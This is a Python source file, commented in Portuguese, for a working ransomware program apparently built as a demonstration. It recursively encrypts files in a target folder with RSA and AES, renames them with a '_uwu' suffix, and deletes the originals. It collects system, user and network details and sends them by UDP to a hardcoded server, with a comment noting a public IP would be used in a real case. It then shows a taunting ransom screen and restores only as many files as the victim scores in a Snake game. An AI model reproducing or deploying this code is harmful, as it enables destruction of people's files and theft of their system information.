import os
import re
import socket
import platform
import psutil
import random
import requests
import time
import tkinter as tk
import pygame as pg
from random import randrange
from pathlib import Path
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES


key = RSA.generate(2048)
publicKey = key.publickey().export_key()
privateKey = key.export_key()

# ip local, em um caso real, esse ip seria mudado para um ip público
ip_address = '192.168.0.166'
port = 9999


def scanRecurse(baseDir):
    '''
    Escaneia um diretório e retornar lista de todos os arquivos
    '''
    for entry in os.scandir(baseDir):
        if entry.is_file():
            yield entry
        else:
            yield from scanRecurse(entry.path)


def encrypt(dataFile, publicKey):
    '''
    Encripta o arquivo com a extensão '_uwu', e remove o arquivo original
    e usa o modo EAX para permitir detecção de modificações não autorizadas
    (é importante para garantir a integridade dos dados)
    '''

    # caso não consiga criptografar um arquivo, o programa segue em frente
    try:
        # ler dados do arquivo
        dataFile = str(dataFile)
        with open(dataFile, 'rb') as f:
            data = f.read()

        # converter dados pra bytes e criar objeto com a chave publica
        data = bytes(data)
        key = RSA.import_key(publicKey)
        sessionKey = os.urandom(16)

        # criptografa a chave da sessão com a chave pública
        cipher = PKCS1_OAEP.new(key)
        encryptedSessionKey = cipher.encrypt(sessionKey)

        # criptografa os dados com a chave da sessão
        cipher = AES.new(sessionKey, AES.MODE_EAX)
        ciphertext, tag = cipher.encrypt_and_digest(data)

        # salvar os dados encriptados ao novo arquivo
        encryptedFile = dataFile + '_uwu'
        with open(encryptedFile, 'wb') as f:
            [f.write(x) for x in (encryptedSessionKey,
                                  cipher.nonce, tag, ciphertext)]
        os.remove(dataFile)
    except:
        pass


def decrypt(dataFile, privateKey):
    '''
    Descriptografa os arquivos e usa o modo EAX para permitir detecção 
    de modificações não autorizadas
    (é importante para garantir a integridade dos dados durante a descriptografia)
    '''
    key = RSA.import_key(privateKey)

    with open(dataFile, 'rb') as f:
        # ler a chave da sessão
        encryptedSessionKey, nonce, tag, ciphertext = [
            f.read(x) for x in (key.size_in_bytes(), 16, 16, -1)]

    # descriptografando a chave da sessão
    cipher = PKCS1_OAEP.new(key)
    sessionKey = cipher.decrypt(encryptedSessionKey)

    # desencriptografar os dados com a chave da sessão
    cipher = AES.new(sessionKey, AES.MODE_EAX, nonce)
    data = cipher.decrypt_and_verify(ciphertext, tag)

    # salvar os dados descriptografados
    dataFile = str(dataFile)
    decryptedFile = dataFile[:-4]
    with open(decryptedFile, 'wb') as f:
        f.write(data)
    os.remove(dataFile)


def udpSocket(ip_address, port, msg):
    '''
    Configuração do socket UDP e envio das informações
    '''
    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    fileName = f'{random.randint(0,1000)}_log.txt'

    with open(fileName, 'w') as file:
        file.write(msg)

    with open(fileName, 'rb') as file:
        while True:
            data = file.read(1024)
            if not data:
                break
            udp_socket.sendto(data, (ip_address, port))
    udp_socket.close()

    try:
        os.remove(fileName)
    except:
        pass


def getLocalIpv4():
    '''
    Adquirindo o IPV4 local através do DNS do google 🤭
    '''
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.connect(("8.8.8.8", 80))
        ipv4 = sock.getsockname()[0]
        sock.close()
        return ipv4
    except:
        return 'Não foi possível recuperar IPV4 local.'


def getPublicIPs():
    '''
    Adquirindo o IPV4 e IPV6 públicos através de uma solicitação HTTP GET
    '''
    try:
        ips = ''

        response_ipv4 = requests.get("https://api.ipify.org?format=json")
        data_ipv4 = response_ipv4.json()
        ipv4 = data_ipv4['ip']
        ips += f'IPV4 Público: {ipv4}\n'

        # dependendo da máquina, o ipv6 não está disponível, e o ipv4 é retornado
        response_ipv6 = requests.get("https://api64.ipify.org?format=json")
        data_ipv6 = response_ipv6.json()
        ipv6 = data_ipv6['ip']
        ips += f'IPV6 Público: {ipv6}\n'

        return ips
    except:
        return 'Não foi possível recuperar IPV4 e IPV6 públicos.'


def getGenInfo():
    '''
    Extraindo informações gerais
    '''
    info = ''
    info += f"Sistema Operacional: {platform.system()}\n"
    info += f"Versão do Sistema Operacional: {platform.release()}\n"
    info += f"Arquitetura da Máquina: {platform.machine()}\n"
    info += f"Nome da Máquina na Rede: {platform.node()}\n"
    info += f"Processador: {platform.processor()}\n"
    info += f"Espaço Total em Disco: {psutil.disk_usage('/').total} bytes\n"
    info += f"Espaço em Disco Usado: {psutil.disk_usage('/').used} bytes\n"
    info += f"Espaço em Disco Livre: {psutil.disk_usage('/').free} bytes\n"

    info += f"\n-----Usuários Logados-----\n"
    for user in psutil.users():
        info += f"Nome do Usuário: {user.name}\n"
        info += f"Terminal: {user.terminal}\n"

    info += f"\n-----Conexões de rede-----\n"
    for conn in psutil.net_connections():
        info += f"Endereço Local: {conn.laddr}\n"
        info += f"Endereço Remoto: {conn.raddr}\n"
        info += f"Estado da Conexão: {conn.status}\n"

    info += f"IPV4 Local: {getLocalIpv4()}\n"
    info += f"\n-----IPS Públicos-----\n"
    info += f"{getPublicIPs()}"

    return info


def warning():
    '''
    Criação da tela de aviso.
    '''
    window = tk.Tk()
    window.title("UwU")
    window.configure(bg="black")

    custom_font = ("system", 20, "bold")
    custom_font2 = ("system", 40, "bold")
    custom_font3 = ("system", 16, "bold")

    text1 = tk.Label(window, text="Caramba, coleguinha!\nParece que algo aconteceu com seus arquivos!\n\n",
                     font=custom_font, fg="red", bg="black")
    text1.pack()

    text2 = tk.Label(window, text='ÒwÓ\n', font=custom_font2,
                     fg="white", bg="black")
    text2.pack()

    text3 = tk.Label(window, text="Todos os seus preciosos arquivos foram criptografados. E para a segurança deles, sugiro que você não reinicie o computador.\nA partir de agora, nós vamos jogar um jogo. No caso, apenas você vai. É bem simples.\nJogue o joguinho clássico Snake, e atinja uma certa pontuação para salvar todos os arquivos. Para cada ponto que você fizer,\num arquivo seu será salvo. Morra no jogo, e você perderá o resto dos arquivos que ainda não salvou. Divertido, não?\n\n",
                     font=custom_font3, fg="red", bg="black")
    text3.pack()

    text4 = tk.Label(window, text="Controles: WASD\nQuando estiver pronto, basta fechar essa janela.",
                     font=custom_font, fg="white", bg="black")
    text4.pack()

    window_width = 900
    window_height = 500
    screen_width = window.winfo_screenwidth()
    screen_height = window.winfo_screenheight()
    x = (screen_width - window_width) // 2
    y = (screen_height - window_height) // 2
    window.geometry(f'{window_width}x{window_height}+{x}+{y}')

    # Execute o loop principal da window
    window.mainloop()


def snake():
    '''
    Jogo snake.
    '''
    WINDOW = 600
    TILE_SIZE = 50
    RANGE = (TILE_SIZE // 2, WINDOW - TILE_SIZE // 2, TILE_SIZE)
    pg.display.set_caption('òwó')
    def get_random_position(): return [randrange(*RANGE), randrange(*RANGE)]
    snake = pg.rect.Rect([0, 0, TILE_SIZE - 2, TILE_SIZE - 2])
    snake.center = get_random_position()
    length = 1
    segments = [snake.copy()]
    snake_dir = (0, 0)
    time, time_step = 0, 58
    food = snake.copy()
    food.center = get_random_position()
    screen = pg.display.set_mode([WINDOW] * 2)
    clock = pg.time.Clock()
    dirs = {pg.K_w: 1, pg.K_s: 1, pg.K_a: 1, pg.K_d: 1}

    while True:
        for event in pg.event.get():
            if event.type == pg.QUIT:
                exit()
            if event.type == pg.KEYDOWN:
                if event.key == pg.K_w and dirs[pg.K_w]:
                    snake_dir = (0, -TILE_SIZE)
                    dirs = {pg.K_w: 1, pg.K_s: 0, pg.K_a: 1, pg.K_d: 1}
                if event.key == pg.K_s and dirs[pg.K_s]:
                    snake_dir = (0, TILE_SIZE)
                    dirs = {pg.K_w: 0, pg.K_s: 1, pg.K_a: 1, pg.K_d: 1}
                if event.key == pg.K_a and dirs[pg.K_a]:
                    snake_dir = (-TILE_SIZE, 0)
                    dirs = {pg.K_w: 1, pg.K_s: 1, pg.K_a: 1, pg.K_d: 0}
                if event.key == pg.K_d and dirs[pg.K_d]:
                    snake_dir = (TILE_SIZE, 0)
                    dirs = {pg.K_w: 1, pg.K_s: 1, pg.K_a: 0, pg.K_d: 1}
        screen.fill('black')
        # checar bordas e se tocar
        self_eating = pg.Rect.collidelist(snake, segments[:-1]) != -1
        if snake.left < 0 or snake.right > WINDOW or snake.top < 0 or snake.bottom > WINDOW or self_eating:
            # derrota / meia derrota
            #snake.center, food.center = get_random_position(), get_random_position()
            #length, snake_dir = 1, (0, 0)
            #segments = [snake.copy()]
            return length - 1
        # checar comida
        if snake.center == food.center:
            food.center = get_random_position()
            length += 1
        # desenhar comida
        pg.draw.rect(screen, 'red', food)
        # desenhar cobra
        [pg.draw.rect(screen, 'green', segment) for segment in segments]
        # mover cobra
        time_now = pg.time.get_ticks()
        if time_now - time > time_step:
            time = time_now
            snake.move_ip(snake_dir)
            segments.append(snake.copy())
            segments = segments[-length:]
        pg.display.flip()
        clock.tick(60)
        if length > 10:
            # vitória
            return 'Win'


# os.getcwd()
directory = 'C:\\teste'
# tipos de arquivo que não serão criptografados
excludeExtension = ['.py', '.pem', '.exe']


# hora de criptografar
for item in scanRecurse(directory):
    filePath = Path(item)
    fileType = filePath.suffix.lower()

    if fileType in excludeExtension:
        continue
    encrypt(filePath, publicKey)

# enviando o log com os dados para o server
try:
    # usando try, porque nem sempre o server vai estar ligado
    udpSocket(ip_address, port, getGenInfo())
except:
    pass

# exibindo o aviso
warning()

time.sleep(10)

pattern = r'.*_uwu$'  # regex para descriptografar todos os arquivos que terminam em _uwu

# hora de jogar e descriptografar (ou não)
snake_result = snake()

if snake_result != 'Win':
    count = 0
    for item in scanRecurse(directory):
        filePath = Path(item)
        fileType = filePath.suffix.lower()
        if re.match(pattern, fileType):
            decrypt(filePath, privateKey)
            count += 1
            if count == snake_result:
                break
else:
    for item in scanRecurse(directory):
        filePath = Path(item)
        fileType = filePath.suffix.lower()
        if re.match(pattern, fileType):
            decrypt(filePath, privateKey)
